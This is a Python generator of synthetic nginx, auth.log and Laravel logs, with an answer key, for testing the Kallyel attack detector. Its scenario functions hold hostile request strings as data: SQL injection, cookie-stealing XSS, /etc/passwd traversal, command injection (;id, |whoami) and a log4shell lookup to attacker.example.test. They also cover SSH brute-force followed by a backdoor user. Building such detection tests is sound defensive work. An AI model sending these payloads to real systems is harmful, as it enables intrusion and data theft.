"""Gerador de logs 100% sintéticos para testar o Kallyel.

Produz tráfego normal (nginx combined, auth.log e laravel.log) e cenários de ataque com
**gabarito** (quais regras devem disparar e para qual IP). Determinístico: mesma semente,
mesmos arquivos.

Este módulo NÃO importa o Kallyel de propósito: o gabarito não pode herdar erros da
ferramenta que ele avalia. Tudo aqui usa só a biblioteca padrão.

Dados sintéticos:

- IPs só das faixas de documentação (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24 e
  2001:db8::/32, RFC 5737/3849). Os atacantes ficam em 203.0.113.200-254; o tráfego normal,
  fora dessa faixa.
- Domínios, usuários, e-mails e senhas são inventados. Nenhum dado de terceiros.
- Não há código de ataque: os "ataques" são apenas linhas de log que descrevem padrões.

Uso::

    python tests/data/generate.py --out saida --nginx-lines 1000000 --scenarios all
"""

from __future__ import annotations

import argparse
import heapq
import json
import sys
from collections.abc import Callable, Iterator, Sequence
from dataclasses import dataclass
from datetime import datetime, timezone
from functools import lru_cache
from pathlib import Path
from random import Random
from typing import Any

START = datetime(2024, 1, 1, 0, 0, 0, tzinfo=timezone.utc)
MEAN_GAP_SECONDS = 0.5  # intervalo médio entre linhas do access.log normal

Line = tuple[float, str]  # (segundos desde a época, texto da linha; pode ter várias linhas)
Expected = tuple[str, str | None]  # (id da regra, IP do achado; None = achado sem IP)

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]


# --------------------------------------------------------------------- formatos
@lru_cache(maxsize=8192)
def _clf_time(second: int) -> str:
    dt = datetime.fromtimestamp(second, tz=timezone.utc)
    return f"{dt.day:02d}/{MONTHS[dt.month - 1]}/{dt.year}:{dt:%H:%M:%S} +0000"


@lru_cache(maxsize=8192)
def _iso_time(second: int) -> str:
    return datetime.fromtimestamp(second, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S+00:00")


@lru_cache(maxsize=8192)
def _laravel_time(second: int) -> str:
    return datetime.fromtimestamp(second, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


def nginx_line(
    ip: str, ts: float, method: str, target: str, status: int, size: int, ua: str, ref: str = "-"
) -> str:
    return f'{ip} - - [{_clf_time(int(ts))}] "{method} {target} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


def auth_line(ts: float, prog: str, pid: int, msg: str) -> str:
    return f"{_iso_time(int(ts))} srv {prog}[{pid}]: {msg}"


def laravel_record(ts: float, level: str, msg: str, trace: Sequence[str] = ()) -> str:
    head = f"[{_laravel_time(int(ts))}] production.{level}: {msg}"
    if not trace:
        return head
    return head + "\n[stacktrace]\n" + "\n".join(trace) + '\n"}'


# ------------------------------------------------------------------- IPs
def ip_pool(rng: Random, size: int = 5000) -> list[str]:
    """IPs do tráfego normal: documentação IPv4 (exceto .200-.254 do último bloco) e IPv6."""
    pool = [f"192.0.2.{i}" for i in range(1, 255)]
    pool += [f"198.51.100.{i}" for i in range(1, 255)]
    pool += [f"203.0.113.{i}" for i in range(1, 200)]
    while len(pool) < size:
        pool.append(
            f"2001:db8:{rng.randrange(0x10000):x}:{rng.randrange(0x10000):x}::{rng.randrange(1, 0x10000):x}"
        )
    return pool


# ------------------------------------------------------------- tráfego normal
PAGES = [
    "/", "/index.php", "/products", "/products?category=books&sort=price", "/cart", "/about",
    "/contact", "/blog", "/blog/post-1", "/api/v1/items", "/api/v1/items/7", "/checkout",
    "/account", "/faq", "/pricing",
]  # fmt: skip
ASSETS = ["/assets/app.css", "/assets/app.js", "/images/logo.png", "/favicon.ico", "/robots.txt"]
# Buscas legítimas que parecem ataques para regex ingênuas: servem para medir falso positivo.
SEARCHES = [
    "livros", "camiseta+azul", "union+station+timetable", "sleep+tips", "o'reilly+books",
    "javascript+tutorial", "cat+food", "select+committee", "etc+passwd+policy", "on+error+handling",
    "uniao+europeia", "bolo+de+cenoura", "script+do+filme", "ls+vs+dir", "how+to+exec+in+python",
]  # fmt: skip
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/8.4.0",
    "python-requests/2.31.0",
]  # fmt: skip

CHROME = USER_AGENTS[0]


def normal_nginx(n: int, rng: Random, start: float, span: float) -> Iterator[Line]:
    """``n`` linhas de access.log legítimo, em ordem cronológica, em memória constante."""
    pool = ip_pool(rng)
    gap = span / n if n else 1.0
    t = start
    rand, choice, expo, randrange = rng.random, rng.choice, rng.expovariate, rng.randrange
    rate = 1.0 / gap
    for _ in range(n):
        t += expo(rate)
        ip = choice(pool)
        ua = choice(USER_AGENTS)
        r = rand()
        if r < 0.86:
            yield t, nginx_line(ip, t, "GET", choice(PAGES), 200, randrange(500, 60000), ua)
        elif r < 0.90:
            target = f"/search?q={choice(SEARCHES)}"
            yield t, nginx_line(ip, t, "GET", target, 200, randrange(2000, 30000), ua)
        elif r < 0.95:
            yield t, nginx_line(ip, t, "GET", choice(ASSETS), 304, 0, ua)
        elif r < 0.975:
            target = f"/old/page-{randrange(1000)}"
            yield t, nginx_line(ip, t, "GET", target, 404, 162, ua)
        elif r < 0.99:
            yield t, nginx_line(ip, t, "GET", f"/product/{randrange(1, 500)}", 301, 169, ua)
        elif r < 0.9965:
            yield (
                t,
                nginx_line(ip, t, "POST", "/login", 302, 0, ua, "https://shop.example.test/login"),
            )
        elif r < 0.998:
            yield (
                t,
                nginx_line(
                    ip, t, "POST", "/login", 401, 120, ua, "https://shop.example.test/login"
                ),
            )
        elif r < 0.999:
            yield t, nginx_line(ip, t, "GET", "/admin", 403, 150, ua)
        else:
            yield t, nginx_line(ip, t, "GET", "/api/v1/report", 500, 80, ua)


SAFE_SUDO = [
    "/usr/bin/apt update", "/usr/bin/apt upgrade -y", "/usr/bin/systemctl restart nginx",
    "/usr/bin/systemctl status php8.2-fpm", "/usr/bin/tail -f /var/log/nginx/error.log",
    "/usr/bin/journalctl -u nginx", "/usr/bin/vim /etc/nginx/nginx.conf",
]  # fmt: skip
USERS = ["deploy", "maria", "joao", "ana", "backup"]


def normal_auth(n: int, rng: Random, start: float, span: float) -> Iterator[Line]:
    """auth.log de um servidor comum: logins por chave, um erro de senha ocasional, sudo, cron."""
    pool = ip_pool(rng, 300)
    gap = span / n if n else 1.0
    t = start
    pid = 1000
    for _ in range(n):
        t += rng.expovariate(1.0 / gap)
        pid += 1
        user, ip, r = rng.choice(USERS), rng.choice(pool), rng.random()
        if r < 0.28:
            yield (
                t,
                auth_line(
                    t,
                    "sshd",
                    pid,
                    f"Accepted publickey for {user} from {ip} port {rng.randrange(20000, 60000)} ssh2: ED25519 SHA256:abc{pid}",
                ),
            )
        elif r < 0.31:  # erro de digitação e acerto na sequência
            yield (
                t,
                auth_line(
                    t,
                    "sshd",
                    pid,
                    f"Failed password for {user} from {ip} port {rng.randrange(20000, 60000)} ssh2",
                ),
            )
            yield (
                t + 3,
                auth_line(
                    t + 3,
                    "sshd",
                    pid,
                    f"Accepted password for {user} from {ip} port {rng.randrange(20000, 60000)} ssh2",
                ),
            )
            t += 3  # o relógio avança junto: a linha seguinte não pode voltar no tempo
        elif r < 0.55:
            cmd = rng.choice(SAFE_SUDO)
            yield (
                t,
                auth_line(
                    t,
                    "sudo",
                    pid,
                    f"  {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}",
                ),
            )
        elif r < 0.85:
            yield (
                t,
                auth_line(
                    t,
                    "CRON",
                    pid,
                    "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
                ),
            )
        else:
            yield t, auth_line(t, "systemd", 1, "Started Daily apt download activities.")


def normal_laravel(n: int, rng: Random, start: float, span: float) -> Iterator[Line]:
    """laravel.log de uma aplicação saudável: info, avisos e erros comuns sem segredos."""
    gap = span / n if n else 1.0
    t = start
    for _ in range(n):
        t += rng.expovariate(1.0 / gap)
        r = rng.random()
        if r < 0.70:
            yield t, laravel_record(t, "INFO", f'Order created {{"id":{rng.randrange(1, 100000)}}}')
        elif r < 0.85:
            yield t, laravel_record(t, "WARNING", "Cache miss for key products:featured")
        elif r < 0.93:
            yield t, laravel_record(t, "ERROR", "The password field is required.")
        elif r < 0.96:
            yield t, laravel_record(t, "ERROR", "CSRF token mismatch.")
        else:
            trace = [
                "#0 /var/www/app/Http/Controllers/OrderController.php(42): App\\Http\\Controllers\\OrderController->show()",
                "#1 /var/www/vendor/laravel/framework/src/Illuminate/Routing/Controller.php(54): call_user_func_array()",
                "#2 {main}",
            ]
            yield (
                t,
                laravel_record(
                    t,
                    "ERROR",
                    'Undefined array key "name" {"exception":"[object] (ErrorException(code: 0))',
                    trace,
                ),
            )


# ---------------------------------------------------------------- cenários
@dataclass(frozen=True)
class Scenario:
    name: str
    description: str
    ip: str | None
    nginx: tuple[Line, ...] = ()
    auth: tuple[Line, ...] = ()
    laravel: tuple[Line, ...] = ()
    expected: tuple[Expected, ...] = ()


ScenarioFactory = Callable[[float, Random], Scenario]

SWEEP_PATHS = [
    "/.env", "/.git/config", "/phpinfo.php", "/wp-config.php.bak", "/backup.sql", "/.htpasswd",
    "/storage/logs/laravel.log", "/admin", "/login", "/wp-login.php", "/server-status",
]  # fmt: skip
WORDLIST = [
    "api", "old", "test", "dev", "backup", "uploads", "config", "private", "tmp", "cgi-bin", "panel",
    "dashboard", "console", "manager", "db", "sql", "dump", "files", "data", "logs", "staging",
]  # fmt: skip


def scanner_sweep(t0: float, rng: Random) -> Scenario:
    ip = "203.0.113.201"
    ua = "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)"
    paths = SWEEP_PATHS + [f"/{w}" for w in WORDLIST] + [f"/{w}/index.php" for w in WORDLIST]
    rng.shuffle(paths)
    lines = []
    for i, path in enumerate(paths[:60]):
        status = 403 if path in ("/admin", "/server-status") else 404
        t = t0 + i
        lines.append((t, nginx_line(ip, t, "GET", path, status, 162, ua)))
    return Scenario(
        "scanner_sweep",
        "Varredura de scanner (Nikto) com lista de caminhos e arquivos sensíveis, 1 requisição/s",
        ip,
        nginx=tuple(lines),
        expected=(("KALLYEL-WEB-004", ip), ("KALLYEL-WEB-005", ip), ("KALLYEL-WEB-007", ip)),
    )


def sqli(t0: float, rng: Random) -> Scenario:
    ip = "203.0.113.202"
    payloads = [
        "/products?id=1'+or+'1'='1", "/products?id=1+UNION+SELECT+null,null,null",
        "/products?id=1+UNION+ALL+SELECT+username,password+FROM+users",
        "/products?id=1;select+pg_sleep(5)", "/products?id=1'+AND+SLEEP(5)--+",
        "/search?q=x'+UNION+SELECT+table_name+FROM+information_schema.tables--",
    ]  # fmt: skip
    lines = []
    for i in range(14):
        t = t0 + i * 3
        status = 500 if i < 12 else 200
        lines.append((t, nginx_line(ip, t, "GET", payloads[i % len(payloads)], status, 80, CHROME)))
    return Scenario(
        "sqli",
        "Injeção de SQL com User-Agent de navegador; a aplicação responde 500 em 12 das 14 tentativas",
        ip,
        nginx=tuple(lines),
        expected=(("KALLYEL-WEB-001", ip), ("KALLYEL-WEB-009", ip)),
    )


def ssh_bruteforce_success(t0: float, rng: Random) -> Scenario:
    ip = "203.0.113.203"
    users = ["root", "admin", "ubuntu", "oracle", "test", "postgres"]
    lines: list[Line] = []
    pid = 5000
    for i in range(12):
        t = t0 + i * 4
        user = users[i % len(users)]
        if i < len(users):
            lines.append(
                (
                    t,
                    auth_line(
                        t, "sshd", pid + i, f"Invalid user {user} from {ip} port {40000 + i}"
                    ),
                )
            )
        lines.append(
            (
                t + 0.1,
                auth_line(
                    t + 0.1,
                    "sshd",
                    pid + i,
                    f"Failed password for {'invalid user ' if i < len(users) else ''}{user} from {ip} port {40000 + i} ssh2",
                ),
            )
        )
    t_ok = t0 + 70
    lines.append(
        (
            t_ok,
            auth_line(
                t_ok, "sshd", pid + 20, f"Accepted password for root from {ip} port 41000 ssh2"
            ),
        )
    )
    lines.append(
        (
            t_ok + 30,
            auth_line(
                t_ok + 30,
                "sudo",
                pid + 21,
                "  root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
            ),
        )
    )
    lines.append(
        (
            t_ok + 40,
            auth_line(
                t_ok + 40,
                "useradd",
                pid + 22,
                "new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash, from=/dev/pts/0",
            ),
        )
    )
    return Scenario(
        "ssh_bruteforce_success",
        "Força bruta de SSH (12 falhas em 48 s), login com sucesso, sudo bash e criação de usuário",
        ip,
        auth=tuple(lines),
        expected=(("KALLYEL-AUTH-001", ip), ("KALLYEL-AUTH-002", ip), ("KALLYEL-AUTH-003", None)),
    )


def login_spray(t0: float, rng: Random) -> Scenario:
    ip = "203.0.113.204"
    lines = []
    for i in range(25):
        t = t0 + i * 2
        lines.append(
            (
                t,
                nginx_line(
                    ip, t, "POST", "/login", 401, 120, CHROME, "https://shop.example.test/login"
                ),
            )
        )
    return Scenario(
        "login_spray",
        "Tentativas repetidas de login web (25 respostas 401 em 48 s)",
        ip,
        nginx=tuple(lines),
        expected=(("KALLYEL-WEB-008", ip),),
    )


def xss(t0: float, rng: Random) -> Scenario:
    ip = "203.0.113.205"
    targets = [
        "/search?q=<script>alert(document.cookie)</script>",
        "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E",
        "/redirect?u=javascript:alert(1)",
    ]
    lines = [
        (t0 + i * 5, nginx_line(ip, t0 + i * 5, "GET", tg, 200, 4000, CHROME))
        for i, tg in enumerate(targets)
    ]
    return Scenario(
        "xss",
        "XSS refletido (3 requisições)",
        ip,
        nginx=tuple(lines),
        expected=(("KALLYEL-WEB-002", ip),),
    )


def traversal(t0: float, rng: Random) -> Scenario:
    ip = "203.0.113.206"
    targets = [
        "/download?file=../../../../etc/passwd",
        "/download?file=..%2f..%2f..%2fetc%2fpasswd",
        "/page?inc=php://filter/convert.base64-encode/resource=index",
    ]
    lines = [
        (t0 + i * 5, nginx_line(ip, t0 + i * 5, "GET", tg, 200 if i == 2 else 404, 300, CHROME))
        for i, tg in enumerate(targets)
    ]
    return Scenario(
        "traversal",
        "Path traversal e LFI (3 requisições)",
        ip,
        nginx=tuple(lines),
        expected=(("KALLYEL-WEB-003", ip),),
    )


def rce(t0: float, rng: Random) -> Scenario:
    ip = "203.0.113.207"
    targets = [
        "/ping?host=127.0.0.1;id",
        "/ping?host=127.0.0.1%7Cwhoami",
        "/api?x=${jndi:ldap://attacker.example.test/a}",
    ]
    lines = [
        (t0 + i * 5, nginx_line(ip, t0 + i * 5, "GET", tg, 200, 500, CHROME))
        for i, tg in enumerate(targets)
    ]
    return Scenario(
        "rce",
        "Injeção de comando e expressão log4shell (3 requisições)",
        ip,
        nginx=tuple(lines),
        expected=(("KALLYEL-WEB-006", ip),),
    )


def laravel_leak(t0: float, rng: Random) -> Scenario:
    trace = [f"#{i} /var/www/vendor/x/Frame{i}.php({i}): call()" for i in range(12)]
    trace.append("#12 /var/www/config/database.php(9): env('DB_PASSWORD=Sup3rS3cretValue')")
    trace.append("#13 {main}")
    record = laravel_record(
        t0,
        "ERROR",
        'Connection failed {"exception":"[object] (PDOException(code: 1045): SQLSTATE[HY000] [1045] Access denied)',
        trace,
    )
    return Scenario(
        "laravel_leak",
        "Erro do Laravel que registra a senha do banco (valor inventado) em um stack trace",
        None,
        laravel=((t0, record),),
        expected=(("KALLYEL-APP-001", None),),
    )


SCENARIOS: dict[str, ScenarioFactory] = {
    "scanner_sweep": scanner_sweep,
    "sqli": sqli,
    "ssh_bruteforce_success": ssh_bruteforce_success,
    "login_spray": login_spray,
    "xss": xss,
    "traversal": traversal,
    "rce": rce,
    "laravel_leak": laravel_leak,
}


# ----------------------------------------------------------------- dataset
def _merge(background: Iterator[Line], extra: Sequence[Line]) -> Iterator[str]:
    """Mescla o fluxo de fundo com as linhas de cenário, em ordem cronológica."""
    merged = heapq.merge(background, sorted(extra, key=lambda x: x[0]), key=lambda x: x[0])
    for _, text in merged:
        yield text


def write_dataset(
    out: Path,
    *,
    nginx_lines: int = 0,
    auth_lines: int = 0,
    laravel_lines: int = 0,
    scenarios: Sequence[str] = (),
    seed: int = 7,
    custom: Sequence[Scenario] = (),
) -> dict[str, Any]:
    """Escreve access.log, auth.log, laravel.log e manifest.json (gabarito) em ``out``.

    ``custom``: cenários já montados (com seus próprios horários e IPs), somados aos de
    ``scenarios``. Usado por ``realistic_day.py``.
    """
    unknown = [s for s in scenarios if s not in SCENARIOS]
    if unknown:
        raise ValueError(f"cenário(s) desconhecido(s): {', '.join(unknown)}")
    out.mkdir(parents=True, exist_ok=True)
    start = START.timestamp()
    span = max(nginx_lines * MEAN_GAP_SECONDS, 3600.0)

    built: list[Scenario] = []
    for i, name in enumerate(scenarios):
        frac = 0.1 + 0.8 * (i + 1) / (len(scenarios) + 1)
        built.append(SCENARIOS[name](start + span * frac, Random(f"{seed}:{name}")))
    built.extend(custom)

    def scen_lines(kind: str) -> list[Line]:
        return [ln for s in built for ln in getattr(s, kind)]

    files: dict[str, int] = {}
    plan: list[tuple[str, int, Callable[[int, Random, float, float], Iterator[Line]], str]] = [
        ("access.log", nginx_lines, normal_nginx, "nginx"),
        ("auth.log", auth_lines, normal_auth, "auth"),
        ("laravel.log", laravel_lines, normal_laravel, "laravel"),
    ]
    for filename, n, gen, kind in plan:
        extra = scen_lines(kind)
        if n == 0 and not extra:
            continue
        rng = Random(f"{seed}:{kind}")
        count = 0
        with (out / filename).open("w", encoding="utf-8", newline="\n") as fh:
            for text in _merge(gen(n, rng, start, span), extra):
                fh.write(text)
                fh.write("\n")
                count += text.count("\n") + 1
        files[filename] = count

    manifest: dict[str, Any] = {
        "seed": seed,
        "start": START.isoformat(),
        "files": files,
        "scenarios": [
            {
                "name": s.name,
                "description": s.description,
                "ip": s.ip,
                "expected": [list(e) for e in s.expected],
            }
            for s in built
        ],
        "expected": sorted({(e[0], e[1] or "") for s in built for e in s.expected}),
    }
    (out / "manifest.json").write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    return manifest


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Gera logs sintéticos para o Kallyel.")
    parser.add_argument("--out", type=Path, required=True, help="pasta de saída")
    parser.add_argument("--nginx-lines", type=int, default=100_000)
    parser.add_argument("--auth-lines", type=int, default=10_000)
    parser.add_argument("--laravel-lines", type=int, default=2_000)
    parser.add_argument(
        "--scenarios",
        default="all",
        help=f"all, none ou lista separada por vírgula: {', '.join(SCENARIOS)}",
    )
    parser.add_argument("--seed", type=int, default=7)
    args = parser.parse_args(argv)
    names = (
        list(SCENARIOS)
        if args.scenarios == "all"
        else []
        if args.scenarios == "none"
        else args.scenarios.split(",")
    )
    try:
        manifest = write_dataset(
            args.out,
            nginx_lines=args.nginx_lines,
            auth_lines=args.auth_lines,
            laravel_lines=args.laravel_lines,
            scenarios=names,
            seed=args.seed,
        )
    except ValueError as exc:
        print(f"erro: {exc}", file=sys.stderr)
        return 2
    print(json.dumps(manifest["files"]))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
